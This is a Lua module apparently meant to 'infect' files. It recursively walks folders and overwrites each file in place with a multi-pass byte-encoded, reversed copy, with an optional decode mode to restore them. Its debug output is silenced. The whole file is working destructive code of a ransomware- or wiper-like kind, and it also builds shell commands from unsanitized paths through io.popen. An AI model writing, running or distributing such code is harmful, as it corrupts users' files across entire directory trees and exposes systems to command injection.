math.randomseed(os.time())

local module = {}
local kr = 10
local kr2 = 1
local key = math.random(10*kr2,3000*kr2)/kr
local cmb = {"q","w","@","^","S","g","f","ju","ns","::"}
local e = cmb[ math.floor((key % 1) * #cmb) + 1 ]
local srf = io.open("soundReplace","r")
local sr = srf:read("*a")

srf:close()

local function printd(t)
    --print(t)
end

local function infectMn1(text, amt, delimiter)
    local function encode_pass(t)
        local out = {}
        local bts = {}

        for i = 1, #t do
            local ch = t:sub(i,i)
            local bbs = bts[ch] or string.byte(ch)
            local b = bbs
            
            bts[ch] = bbs
            
            out[#out+1] = tostring(b) .. delimiter
        end

        return table.concat(out):reverse()
    end

    local t = text
    for i = 1, amt do
        t = encode_pass(t)
    end

    local header = "DELIM="..delimiter.."\nPASSES="..amt.."\n"
    return header .. t
end

local function decode_file(text)
    if not text then return nil end

    local delim = text:match("DELIM=(.-)\n")
    local passes = tonumber(text:match("PASSES=(%d+)\n"))
    local body   = text:match("PASSES=%d+\n(.+)$")

    if not delim or not body or not passes then
        return nil
    end

    local function decode_pass(t)
        local rev = t:reverse()
        local out = {}

        for num in rev:gmatch("(%d+)" .. delim) do
            out[#out+1] = string.char(tonumber(num))
        end

        return table.concat(out)
    end

    local t = body
    for i = 1, passes do
        t = decode_pass(t)
    end

    return t
end

local function infect_file(dir,mamt)
    local f = io.open(dir, "rb")
    if not f then
        printd("Read error")
        return
    end

    local original = f:read("*a")
    f:close()

    printd("Original:")
    printd(original)

    local amt = (mamt or 1) + math.floor(key/1000)
    local infected = infectMn1(original, amt, e)

    local fw = io.open(dir, "wb")
    if not fw then
        printd("Write error")
        return
    end
    fw:write(infected)
    fw:close()

    printd("\nFile infected.")
end

local function decodeStep(dir)
    local f = io.open(dir,"rb")
    if not f then
        printd("Read error")
        return
    end

    local text = f:read("*a")
    f:close()

    local decoded = decode_file(text)

    printd("\nDecoded:")
    printd(decoded or "<nil>")

    if decoded then
        local f2 = io.open(dir,"wb")
        if not f2 then
            printd("Write error")
            return
        end
        f2:write(decoded)
        f2:close()
        return decoded
    end
end

local function killFile(dir,times)
    for i=1,1 + (times or 1) do
        infect_file(dir,1)
    end
end

local function decode(dir)
    local d = true
    
    while d do
        d = decodeStep(dir)
        
        if not d then
            break
        end
    end
end

local function getFileExtension(filename)
    return filename:match("^.+(%..+)$") or ""
end

local function is_windows()
    return package.config:sub(1,1) == "\\"
end

local function get_child_files(path)
    local files = {}
    local cmd

    if is_windows() then
        cmd = string.format('dir /b /a-d "%s"', path)
    else
        cmd = string.format('ls -p "%s" | grep -v /', path)
    end

    local p = io.popen(cmd)
    if not p then
        error("Failed to run directory listing command")
    end

    for file in p:lines() do
        table.insert(files, file)
    end
    p:close()

    return files
end

local function fileBit(dir,mode,p)
    if mode == 1 then
        decode(dir)
    elseif mode == 2 then
        killFile(dir,p.times)
    end
end

function module.process(dir,mode,p)
    local ext = getFileExtension(dir)
    
    if ext == "" or #ext > 5 then
        print("Folder: "..dir)
        for i,v in ipairs(get_child_files(dir)) do
            local trueDir = dir .. "\\" .. v
            
            module.process(trueDir,mode,p)
        end
    else
        print(ext..": "..dir)
        fileBit(dir,mode,p)
    end
end

return module